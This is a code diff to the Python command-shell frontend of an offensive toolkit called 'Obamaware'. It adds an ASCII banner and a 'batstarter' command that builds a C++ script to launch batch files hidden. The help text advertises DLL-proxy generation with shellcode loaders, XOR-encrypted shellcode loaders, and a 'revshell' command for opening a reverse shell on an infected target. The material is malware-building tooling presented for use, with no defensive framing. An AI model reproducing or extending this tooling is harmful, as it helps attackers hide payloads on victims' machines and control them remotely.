@@ -17,7 +17,19 @@ body = "USER ### GET"
 
 
 class Obamaware(cmd.Cmd):
-    intro = '\033[32mWelcome to the Obamaware shell. \033[32mType help to list commands.\033[0m\n'
+    intro = """   
+ ▒█████   ▄▄▄▄    ▄▄▄       ███▄ ▄███▓ ▄▄▄       █     █░ ▄▄▄       ██▀███  ▓█████ 
+▒██▒  ██▒▓█████▄ ▒████▄    ▓██▒▀█▀ ██▒▒████▄    ▓█░ █ ░█░▒████▄    ▓██ ▒ ██▒▓█   ▀ 
+▒██░  ██▒▒██▒ ▄██▒██  ▀█▄  ▓██    ▓██░▒██  ▀█▄  ▒█░ █ ░█ ▒██  ▀█▄  ▓██ ░▄█ ▒▒███   
+▒██   ██░▒██░█▀  ░██▄▄▄▄██ ▒██    ▒██ ░██▄▄▄▄██ ░█░ █ ░█ ░██▄▄▄▄██ ▒██▀▀█▄  ▒▓█  ▄ 
+░ ████▓▒░░▓█  ▀█▓ ▓█   ▓██▒▒██▒   ░██▒ ▓█   ▓██▒░░██▒██▓  ▓█   ▓██▒░██▓ ▒██▒░▒████▒
+░ ▒░▒░▒░ ░▒▓███▀▒ ▒▒   ▓▒█░░ ▒░   ░  ░ ▒▒   ▓▒█░░ ▓░▒ ▒   ▒▒   ▓▒█░░ ▒▓ ░▒▓░░░ ▒░ ░
+  ░ ▒ ▒░ ▒░▒   ░   ▒   ▒▒ ░░  ░      ░  ▒   ▒▒ ░  ▒ ░ ░    ▒   ▒▒ ░  ░▒ ░ ▒░ ░ ░  ░
+░ ░ ░ ▒   ░    ░   ░   ▒   ░      ░     ░   ▒     ░   ░    ░   ▒     ░░   ░    ░   
+    ░ ░   ░            ░  ░       ░         ░  ░    ░          ░  ░   ░        ░  ░
+               ░                                                                   
+    
+\033[32mWelcome to the Obamaware shell. \033[32mType help to list commands.\033[0m\n"""
     prompt = 'Obamaware>'
     file = None
     def __init__(self):
@@ -167,6 +179,11 @@ class Obamaware(cmd.Cmd):
         line = "null null " + line
         args = ' '.join([i.strip() for i in line.strip().split(' ') if i])
         os.system('python DllProxyGenerator.py ' + args)
+    
+    def do_batstarter(self, line):
+        print("")
+        args = ' '.join([i.strip() for i in line.strip().split(' ') if i])
+        os.system('python DllProxyGenerator.py bat_starter ' + args)
 
     def do_cmd(self, line):
         args = ' '.join([i.strip() for i in line.strip().split(' ') if i])
@@ -178,13 +195,15 @@ class Obamaware(cmd.Cmd):
     
 
     def do_help(self, line):
-        print("\033[32mCommands:\033[0m")
-        print("  \033[32mproxy\033[0m - Create a dll-proxy + optional ShellcodeLoader creation\n          \033[33m<dll_path> <output_exe_path> [<shellcode_path> <xor_key>] <cpp_script_path(output)>\n")
-        print("  \033[32mshellCodeLoader\033[0m - Create a shellCodeLoader with XOR encrypted payload\n                    \033[33m<shellcode_path> <xor_key> <cpp_script_path(output)>\n")
+        print("\n")
+        print("  \033[32mproxy\033[0m - Create a dll-proxy + optional ShellcodeLoader creation\n          \033[94m<dll_path> <output_exe_path> <cpp_script_path(output)>\n")
+        print("  \033[32mshellCodeLoader\033[0m - Create a shellCodeLoader with XOR encrypted payload\n                    \033[94m<shellcode_path> <xor_key> <cpp_script_path(output)>\n")
+        print("  \033[32mbatstarter\033[0m - Create a cpp Script to start a .bat hiddden\n               \033[94m<path to bat> [<path to bat> ...]\n")
+        print("  \033[32mrevshell\033[0m - Establish a reverse shell to an infected target\n             \033[94m<name>\n")
         print("  \033[32mclear\033[0m - Clear the console")
-        print("  \033[32mexit\033[0m - Exit the shell")
+        print("  \033[32mexit>/EOF\033[0m - Exit the shell")
         print("  \033[32mhelp\033[0m - Show this help message")
-        print("  \033[32mscmd\033[0m <command> - Execute a cmd command")
+        print("  \033[32mcmd\033[0m <command> - Execute a cmd command")
     
     def default(self, line):
         args = ' '.join([i.strip() for i in line.strip().split(' ') if i])
